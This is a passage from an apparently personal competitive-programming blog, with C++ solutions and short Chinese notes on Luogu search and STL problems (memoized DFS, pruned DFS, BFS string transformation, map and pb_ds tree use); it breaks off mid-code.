<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="P1434-SHOI2002-滑雪"><a href="#P1434-SHOI2002-滑雪" class="headerlink" title="P1434 [SHOI2002] 滑雪"></a>P1434 [SHOI2002] 滑雪</h2><p>经典的记忆化搜索了 开个<code>f[x][y]</code>记录一下 dp用dfs写更加自然 边界也更好判定<br>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> r,c,a[<span class="number">105</span>][<span class="number">105</span>],f[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(f[x][y])<span class="keyword">return</span> f[x][y];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> tmp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> nx,ny;</span><br><span class="line">nx=x+dx[i],ny=y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(nx&lt;<span class="number">1</span>||ny&lt;<span class="number">1</span>||nx&gt;r||ny&gt;c)<span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(a[nx][ny]&lt;a[x][y])</span><br><span class="line">tmp=max(tmp,dfs(nx,ny));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> f[x][y]=tmp+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=r;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=c;j++)</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line"><span class="type">int</span> maxx=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=r;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=c;j++)</span><br><span class="line">maxx=max(maxx,dfs(i,j));</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;maxx&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="P1585-魔法阵"><a href="#P1585-魔法阵" class="headerlink" title="P1585 魔法阵"></a>P1585 魔法阵</h2><p>80pts版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">int</span> n,m,k1,k2,MOD;</span><br><span class="line"><span class="type">int</span> minn=INT_MAX;</span><br><span class="line"><span class="type">bool</span> vis[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="type">int</span> jl[<span class="number">1300</span>][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> cnt,<span class="type">int</span> maxx)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cnt==n*m)&#123;</span><br><span class="line"><span class="type">int</span> id = (cnt)%MOD;</span><br><span class="line"><span class="type">int</span> val = k1*<span class="built_in">abs</span>(x-jl[id][<span class="number">0</span>])+k2*<span class="built_in">abs</span>(y-jl[id][<span class="number">1</span>]);</span><br><span class="line">minn = min(minn,max(maxx,val));</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(maxx&gt;=minn)<span class="keyword">return</span> ;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> nx = x+dx[i];</span><br><span class="line"><span class="type">int</span> ny = y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(nx&lt;<span class="number">1</span>||ny&lt;<span class="number">1</span>||nx&gt;n||ny&gt;m||vis[nx][ny])<span class="keyword">continue</span>;</span><br><span class="line"><span class="type">int</span> id = (cnt)%MOD;</span><br><span class="line"><span class="type">int</span> now_maxx = maxx;</span><br><span class="line"><span class="keyword">if</span>(jl[id][<span class="number">0</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> val = k1*<span class="built_in">abs</span>(x-jl[id][<span class="number">0</span>])+k2*<span class="built_in">abs</span>(y-jl[id][<span class="number">1</span>]);</span><br><span class="line">now_maxx = max(maxx,val);</span><br><span class="line">vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line">dfs(nx,ny,cnt+<span class="number">1</span>,now_maxx);</span><br><span class="line">vis[nx][ny] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">jl[id][<span class="number">0</span>] = x, jl[id][<span class="number">1</span>] = y;</span><br><span class="line">vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line">dfs(nx,ny,cnt+<span class="number">1</span>,maxx);</span><br><span class="line">jl[id][<span class="number">0</span>] = <span class="number">0</span>, jl[id][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">vis[nx][ny] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;k1&gt;&gt;k2;</span><br><span class="line">MOD = n*m/<span class="number">2</span>;</span><br><span class="line">jl[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>, jl[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">vis[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">dfs(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;minn&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题可以做一个可行性剪枝 因为很多走法是无法遍历所有格点的<br>比如当前点为 <code>(x,y)</code><br>我发现 我的左右都走过了(或者是边界) 而上下都没走过 那么肯定是不行的<br>同理   我的上下都走过了(或者是边界) 而左右都没走过 那么也是不行的</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">int</span> n,m,k1,k2,MOD;</span><br><span class="line"><span class="type">int</span> minn=INT_MAX;</span><br><span class="line"><span class="type">bool</span> vis[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="type">int</span> jl[<span class="number">1300</span>][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> cnt,<span class="type">int</span> maxx)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cnt==n*m)&#123;</span><br><span class="line"><span class="type">int</span> id = (cnt)%MOD;</span><br><span class="line"><span class="type">int</span> val = k1*<span class="built_in">abs</span>(x-jl[id][<span class="number">0</span>])+k2*<span class="built_in">abs</span>(y-jl[id][<span class="number">1</span>]);</span><br><span class="line">minn = min(minn,max(maxx,val));</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(maxx&gt;=minn)<span class="keyword">return</span> ;</span><br><span class="line"><span class="comment">// to-cut</span></span><br><span class="line"><span class="keyword">if</span>(vis[x<span class="number">-1</span>][y]&amp;vis[x+<span class="number">1</span>][y]&amp;!vis[x][y<span class="number">-1</span>]&amp;!vis[x][y+<span class="number">1</span>])<span class="keyword">return</span> ;</span><br><span class="line"><span class="keyword">if</span>(!vis[x<span class="number">-1</span>][y]&amp;!vis[x+<span class="number">1</span>][y]&amp;vis[x][y<span class="number">-1</span>]&amp;vis[x][y+<span class="number">1</span>])<span class="keyword">return</span> ;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> nx = x+dx[i];</span><br><span class="line"><span class="type">int</span> ny = y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(nx&lt;<span class="number">1</span>||ny&lt;<span class="number">1</span>||nx&gt;n||ny&gt;m||vis[nx][ny])<span class="keyword">continue</span>;</span><br><span class="line"><span class="type">int</span> id = (cnt)%MOD;</span><br><span class="line"><span class="type">int</span> now_maxx = maxx;</span><br><span class="line"><span class="keyword">if</span>(jl[id][<span class="number">0</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> val = k1*<span class="built_in">abs</span>(x-jl[id][<span class="number">0</span>])+k2*<span class="built_in">abs</span>(y-jl[id][<span class="number">1</span>]);</span><br><span class="line">now_maxx = max(maxx,val);</span><br><span class="line">vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line">dfs(nx,ny,cnt+<span class="number">1</span>,now_maxx);</span><br><span class="line">vis[nx][ny] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">jl[id][<span class="number">0</span>] = x, jl[id][<span class="number">1</span>] = y;</span><br><span class="line">vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line">dfs(nx,ny,cnt+<span class="number">1</span>,maxx);</span><br><span class="line">jl[id][<span class="number">0</span>] = <span class="number">0</span>, jl[id][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">vis[nx][ny] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;k1&gt;&gt;k2;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">vis[i][<span class="number">0</span>] = vis[i][m+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=m+<span class="number">1</span>;j++)</span><br><span class="line">vis[<span class="number">0</span>][j] = vis[n+<span class="number">1</span>][j] = <span class="number">1</span>;</span><br><span class="line">MOD = n*m/<span class="number">2</span>;</span><br><span class="line">jl[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>, jl[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">vis[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">dfs(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;minn&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Accepted</strong></p><h2 id="P1032-字串变换"><a href="#P1032-字串变换" class="headerlink" title="P1032 字串变换"></a>P1032 字串变换</h2><p>bfs 回忆了一下 <code>queue</code> 和 <code>set</code>的一些用法 还有 <code>s.find()</code> <code>string::npos</code> 等 抽时间把<code>STL</code>专练一下</p><p>80pts’exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="built_in">string</span> A,B;</span><br><span class="line"><span class="built_in">string</span> s1[<span class="number">1005</span>],s2[<span class="number">1005</span>];<span class="type">int</span> n;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">did</span>&#123;</span></span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"><span class="built_in">string</span> now;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">set</span>&lt;<span class="built_in">string</span>&gt;st;</span><br><span class="line"><span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bfs</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">queue</span>&lt;did&gt;q;</span><br><span class="line">did z;</span><br><span class="line">z.c = <span class="number">0</span>;z.now = A;</span><br><span class="line">q.push(z);st.insert(A);</span><br><span class="line"><span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">z = q.front();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="built_in">string</span> s = z.now;</span><br><span class="line"><span class="keyword">if</span>(z.c&gt;<span class="number">10</span>)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO ANSWER!\n&quot;</span>;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(s == B)&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;z.c&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> t;</span><br><span class="line"><span class="type">int</span> l1 = s.length();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">t = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">auto</span> it = s.find(s1[i]);</span><br><span class="line"><span class="keyword">if</span>(it!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line"><span class="type">int</span> l2 = s1[i].length(),l3 = s2[i].length();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;it;k++)t += s[k];</span><br><span class="line">t += s2[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=it+l2;k&lt;l1;k++)t += s[k];</span><br><span class="line"><span class="keyword">if</span>(!st.count(t))&#123;</span><br><span class="line">st.insert(t);</span><br><span class="line">did d;</span><br><span class="line">d.c = z.c+<span class="number">1</span>;</span><br><span class="line">d.now = t;</span><br><span class="line">q.push(d);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;A&gt;&gt;B;</span><br><span class="line"><span class="built_in">string</span> s,t;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;t)&#123;</span><br><span class="line">n++;</span><br><span class="line">s1[n] = s,s2[n] = t;</span><br><span class="line">&#125;</span><br><span class="line">bfs();</span><br><span class="line"><span class="keyword">if</span>(!flag)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO ANSWER!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>懒得管了…</p><h1 id="STL-数据结构"><a href="#STL-数据结构" class="headerlink" title="STL&#x2F;数据结构"></a>STL&#x2F;数据结构</h1><p>C++的强大特性 骗分利器!</p><h2 id="P5250-【深基17-例5】木材仓库"><a href="#P5250-【深基17-例5】木材仓库" class="headerlink" title="P5250 【深基17.例5】木材仓库"></a>P5250 【深基17.例5】木材仓库</h2><p>用map实现<br>要注意STL的end都是空迭代器！！ 而不是最后一个元素！！！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="type">int</span>,<span class="type">int</span>&gt;mp;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">while</span>(n--)&#123;</span><br><span class="line"><span class="type">int</span> a,b;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(mp.count(b))<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Already Exist\n&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> mp[b]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(mp.size()==<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Empty\n&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(mp.count(b))&#123;</span><br><span class="line">mp.erase(b);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;b&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">mp[b] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">auto</span> it = mp.find(b);</span><br><span class="line"><span class="keyword">auto</span> it3=it;</span><br><span class="line"><span class="keyword">auto</span> it2 = it;</span><br><span class="line">it++;</span><br><span class="line"><span class="keyword">if</span>(it == mp.end())&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;(--it2)-&gt;first&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">mp.erase(it2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(it2 == mp.begin())&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;(it)-&gt;first&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">mp.erase(it);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b-(--it2)-&gt;first&gt;(it)-&gt;first-b)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;(it)-&gt;first&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">mp.erase(it);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;(it2)-&gt;first&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">mp.erase(it2);</span><br><span class="line">&#125;</span><br><span class="line">mp.erase(it3);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="P1503-鬼子进村"><a href="#P1503-鬼子进村" class="headerlink" title="P1503 鬼子进村"></a>P1503 鬼子进村</h2><p>一道典型的需要 插入 删除 查找前驱后驱的数据结构题<br>用pbds来实现平衡树<br>好久没打了 跟着敲一遍</p><p>exp:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ext/pb_ds/assoc_container.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ext/pb_ds/tree_policy.hpp&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> __gnu_cxx;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> __gnu_pbds;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">typedef</span> tree&lt;<span class="type">int</span>,null_type,less&lt;<span class="type">int</span>&gt;,rb_tree_tag,tree_order_statistics_node_update&gt;Tree;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">5e4</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> 